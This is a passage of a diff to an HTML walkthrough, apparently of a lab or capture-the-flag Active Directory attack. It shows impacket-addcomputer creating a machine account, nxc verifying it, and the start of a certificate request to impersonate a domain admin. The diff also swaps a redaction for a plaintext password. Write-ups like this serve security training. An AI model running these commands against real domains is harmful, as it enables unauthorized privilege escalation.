@@ -528,13 +528,13 @@ MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
   </div>
 
   <h3><span class="step">[Step 19]</span> Adding a Computer Account</h3>
-  <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass '[REDACTED]' \
+  <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass 'Zerotrace123!' \
     ANOMALY.HSM/Brandon_Boyd:'[REDACTED]' -dc-ip 10.1.111.50
-[*] Successfully added machine account BRANDON-PC$ with password [REDACTED].</code></pre>
+[*] Successfully added machine account BRANDON-PC$ with password Zerotrace123!.</code></pre>
 
   <p>Verification:</p>
-  <pre><code>$ nxc smb 10.1.111.50 -u 'BRANDON-PC$' -p '[REDACTED]'
-SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:[REDACTED]</code></pre>
+  <pre><code>$ nxc smb 10.1.111.50 -u 'BRANDON-PC$' -p 'Zerotrace123!'
+SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!</code></pre>
 
   <h3><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
   <p>I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
